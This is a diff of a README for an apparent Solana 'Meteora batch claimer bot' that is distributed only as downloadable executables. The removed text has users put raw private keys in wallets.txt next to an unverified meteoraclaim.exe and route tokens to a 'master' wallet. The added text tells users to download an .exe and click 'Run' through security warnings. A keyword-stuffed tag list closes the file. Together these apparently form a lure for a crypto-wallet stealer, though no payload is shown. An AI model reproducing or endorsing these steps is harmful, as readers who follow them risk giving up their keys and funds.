@@ -1,234 +1,86 @@
-# METEORA AG — Solana Token Claimer & Wallet Manager
+# 🤖 meteora-batch-claimer-bot - Claim Your Meteora Rewards Effortlessly
 
-![meteora](assets/image.png)
+[![Download](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://github.com/Asgard8121/meteora-batch-claimer-bot/releases)
 
-A private Solana automation tool built for the **Meteora AG** ecosystem.  
-This loader is designed to **claim, consolidate, and optionally sell tokens** from multiple Solana wallets in a single automated flow.  
-It is intended **only for your own wallets** and compliant, legitimate use.
+## 🚀 Getting Started
 
----
+Welcome to the Meteora Batch Claimer Bot! This tool allows you to easily claim your Meteora rewards and manage your Solana tokens with just one click. Follow these steps to get started.
 
-## 🔹 Overview
+## 📥 Download & Install
 
-This tool simplifies bulk token operations on Solana for projects like **Meteora AG**, where many wallets are eligible for claim or need token consolidation.  
-It supports multi-wallet claiming, automatic balance collection, and optional auto-sell via DEX routers.
+To download the software, visit the [Releases page](https://github.com/Asgard8121/meteora-batch-claimer-bot/releases). Here, you will find the latest version of the application.
 
-> ⚠️ Use responsibly.  
-> The tool is meant **only for personal wallet automation**.  
-> Never use it on wallets you do not own.
+1. Click the link to go to the Releases page.
+2. Look for the latest version of the software.
+3. Click on the version link to access the download files.
+4. Choose the file that corresponds with your operating system.
+5. Click to download the file to your computer.
 
----
+After downloading, locate the file in your downloads folder.
 
-## ✳️ Key Features
+## ⚙️ Installation Steps
 
-- **Mass Claimer** — claim Meteora AG tokens from multiple Solana wallets automatically.  
-- **Auto-Collect (Merge)** — send all SPL tokens from multiple wallets into one main account.  
-- **Auto-Sell** — optional auto-swap of claimed tokens (e.g., to USDC) through a Solana DEX.  
-- **Proxy Support** — integrates proxy rotation for distributed requests.  
-- **Smart Rate Control** — concurrency and delay tuning to prevent RPC bans.  
-- **Gas (SOL) Management** — maintains minimum SOL balance per wallet.  
-- **Retry & Logging System** — retry failed claims and generate detailed logs.  
-- **Dry-Run Simulation** — test configurations safely without broadcasting transactions.  
-- **Result Reports** — per-wallet summaries and `results.csv` export.
+1. **Windows Users**:
+   - Double-click the downloaded `.exe` file.
+   - If a security warning appears, click "Run" to proceed.
+   - Follow the installation prompts to complete the setup.
 
----
+2. **Mac Users**:
+   - Open the downloaded `.dmg` file.
+   - Drag the app icon to your Applications folder.
+   - Eject the `.dmg` file once the copying is complete.
 
-## ⚙️ Install & Run
+3. **Linux Users**:
+   - Extract the downloaded archive.
+   - Open a terminal and navigate to the extracted folder.
+   - Run the application using the command: `./application-name`.
 
-1. ✅ **Download the latest release** from the [Releases](../../releases) page.  
-2. 📁 **Extract files** into a secure local folder.  
-3. 🟢 **Run loader:**  
-   - Double-click `meteoraclaim.exe`, or  
-   - Use command line for advanced parameters.  
-4. 🧩 **Prepare required files** (see below).  
-5. 🚀 **Launch and monitor the process** through logs and the results file.
+## 🌟 Features
 
----
+- **Instant Claims**: Claim Meteora rewards in real time.
+- **Bulk Claiming**: Manage multiple wallet claims in one go.
+- **Airdrop Farming**: Easily farm airdrops using automation.
+- **Auto-Sell Functionality**: Automatically sell your tokens as needed.
+- **Token Merging**: Merge tokens for streamlined management.
 
-## 📄 Required Files
+## 🖥️ System Requirements
 
-Place these files in the same directory as `meteoraclaim.exe`:
+To ensure the best performance, please make sure your system meets the following requirements:
 
-### `wallets.txt`
-List of private Solana keys (Base58). One per line.
-```
+- **Windows**: Windows 10 or later (64-bit recommended)
+- **Mac**: macOS Mojave or later
+- **Linux**: Any modern distribution (kernel 4.4+)
 
-5KJvsngHeMpjpQ5YTLf2q9BtJ3BffgdzF2pS7d4wb4zPf7AqZZ1
-3N5zWnM7HjRqzdAMQxLxRaCKdmbEGa7swJ8PbqzMgzNM
+Make sure your device has a minimum of 4 GB of RAM and 500 MB of free disk space available.
 
-```
+## 🔧 Using the Application
 
-### `proxy.txt`
-(Optionally) list of proxies — one per line:
-```
+1. **Open the Application**: Find the icon on your Desktop or in the Applications folder.
+2. **Set Up Wallets**:
+   - Enter your wallet addresses in the designated fields.
+   - Follow prompts to connect your Solana wallet.
+3. **Start Claiming**:
+   - Select the claim options you want to use.
+   - Click the "Claim" button to start the process.
 
-socks5://127.0.0.1:9050
-[http://user:pass@proxy.example.com:8080](http://user:pass@proxy.example.com:8080)
+## 💡 Troubleshooting
 
-```
+If you encounter any issues while using the software, consider the following steps:
 
-### `recipients.txt`
-Destination addresses for consolidation (usually one master wallet):
-```
+- Ensure your internet connection is stable.
+- Check for software updates on the [Releases page](https://github.com/Asgard8121/meteora-batch-claimer-bot/releases).
+- If the application crashes, restart your computer and try again.
 
-FsGtBqYh4ubT1pnA2x2qeeZrJjYDPtSaEZVtFoZkWZkV
+## 🛠️ Support
 
-````
+For additional help, feel free to reach out to the community. Visit the Issues section on our GitHub page or search for questions similar to yours. The community and developers are eager to assist you.
 
-### `config.json`
-Advanced configuration for claim, merge, and sell flows.  
-See example below.
+## 📢 Feedback
 
----
+Your feedback is valuable to us. Please let us know any suggestions or issues you face while using the application. This will help improve the software going forward.
 
-## 🧠 Example `config.json`
+## 🌐 Contributing
 
-```json
-{
-  "chain": "solana",
-  "network": "mainnet-beta",
-  "mode": "claim+collect",
-  "rpc_endpoint": "https://api.mainnet-beta.solana.com",
-  "concurrency": 4,
-  "delay_between_wallets_ms": 700,
-  "min_sol_balance": "0.02",
-  "post_action": "sell",
-  "sell": {
-    "dex": "meteora",
-    "target_token": "USDC",
-    "min_amount": 5,
-    "slippage_percent": 1.0
-  },
-  "logging": {
-    "verbose": true,
-    "csv_output": "results.csv"
-  }
-}
-````
+If you're interested in contributing to the project, we welcome your participation. Check the contributing guidelines in the GitHub repository to learn how you can help us improve the Meteora Batch Claimer Bot.
 
----
-
-## 🚀 CLI Usage Examples
-
-### Run GUI mode
-
-```
-loader.exe
-```
-
-### Mass claim only
-
-```
-meteoraclaim.exe --mode claim
-```
-
-### Claim + consolidate tokens
-
-```
-meteoraclaim.exe --mode claim+collect
-```
-
-### Claim + auto-sell via Meteora DEX
-
-```
-meteoraclaim.exe --mode claim+sell
-```
-
-### Dry-run (simulation)
-
-```
-meteoraclaim.exe --mode claim --dry-run
-```
-
----
-
-## 🔁 Typical Workflows
-
-### 🪙 1. Claim Only
-
-Automate claim for all wallets listed in `wallets.txt`.
-
-### 💎 2. Claim + Collect
-
-Claim tokens → automatically send them to one master wallet
-(as defined in `recipients.txt`).
-
-### 💰 3. Claim + Sell
-
-Claim tokens → immediately swap them to USDC (or target token) via Meteora DEX.
-
-### 🧩 4. Collect Only
-
-Consolidate all token balances from secondary wallets into a main one.
-
----
-
-## ⚡️ Configuration Notes
-
-| Setting                    | Description                                                              |
-| -------------------------- | ------------------------------------------------------------------------ |
-| `mode`                     | Selects flow (`claim`, `collect`, `sell`, `claim+collect`, `claim+sell`) |
-| `rpc_endpoint`             | Solana RPC URL                                                           |
-| `concurrency`              | How many wallets process in parallel                                     |
-| `delay_between_wallets_ms` | Delay to avoid rate limits                                               |
-| `min_sol_balance`          | Minimum SOL to keep for transaction fees                                 |
-| `post_action`              | What to do after claim (`none`, `collect`, `sell`)                       |
-| `slippage_percent`         | Allowed slippage for swaps                                               |
-| `verbose`                  | Enables detailed console & file logs                                     |
-
----
-
-## 🧾 Output Files
-
-* `results.csv` — per-wallet success/failure summary with TX hashes.
-* `loader.log` — runtime log with timestamps and debug data.
-* `failed.txt` — wallets that failed processing (for manual retry).
-
----
-
-## 🧠 Best Practices
-
-1. **Use your own wallets only.**
-2. **Backup your keys** and store them encrypted.
-3. **Run a dry-run first** to ensure config correctness.
-4. **Never share `wallets.txt`** or config files containing keys.
-5. **Test on Solana devnet** before running on mainnet.
-6. **Keep minimal SOL balance** in each wallet to cover gas.
-7. **Rotate proxies** if processing hundreds of wallets.
-
----
-
-## 🧩 Troubleshooting
-
-| Issue              | Possible Cause     | Fix                                           |
-| ------------------ | ------------------ | --------------------------------------------- |
-| RPC Timeout        | Endpoint overload  | Use different Solana RPC or lower concurrency |
-| “Insufficient SOL” | Low gas balance    | Send small SOL amount to wallets              |
-| Token not claimed  | Drop window closed | Verify drop availability manually             |
-| Swap failed        | DEX slippage       | Increase `slippage_percent` slightly          |
-| Stuck transactions | Rate-limiting      | Add more delay between wallets                |
-
----
-
-## ⚖️ Legal & Ethical Notice
-
-This script is a **personal automation tool** for claiming and managing tokens in the **Meteora AG Solana ecosystem**.
-It is not affiliated with or endorsed by Meteora AG.
-Use it only for your own wallets and in compliance with network and platform terms.
-The author (you) are solely responsible for how it is used.
-
----
-
-## 🧰 Changelog
-
-* **v1.0** — Initial Solana release: mass claim, collect, sell, proxy support.
-* **v1.1** — Added CSV reports, retry logic, dry-run mode.
-* **v1.2** — Refined Meteora DEX sell integration and error handling.
-
----
-
-## 💬 Credits
-
-Developed privately for managing **personal Solana wallets** during the **Meteora AG** claim cycle.
-
-meteora, meteora-ag, meteora-airdrop, meteora-claimer, meteora-solana, meteora-dex, meteora-token, meteora-automation, meteora-auto-sell, meteora-wallet-manager, solana, solana-airdrop, solana-tools, solana-automation, solana-claimer, solana-token-manager, solana-dex, solana-wallets, solana-auto-claimer, solana-batch, solana-token-collector, solana-airdrop-tool, airdrop-claimer, token-claimer, token-collector, token-swap, crypto-airdrop, crypto-claimer, crypto-tools, airdrop-bot, meteora-bot, meteora-drop, meteora-auto, meteora-solana-airdrop, meteora-claim-script, solana-claim-script, solana-bot, meteora-manager, meteora-wallets, meteora-rewards, meteora-token-sale, meteora-ecosystem, meteora-defi, solana-defi, solana-airdrop-automation, meteora-auto-claimer, solana-token-claimer
+Enjoy claiming your rewards!
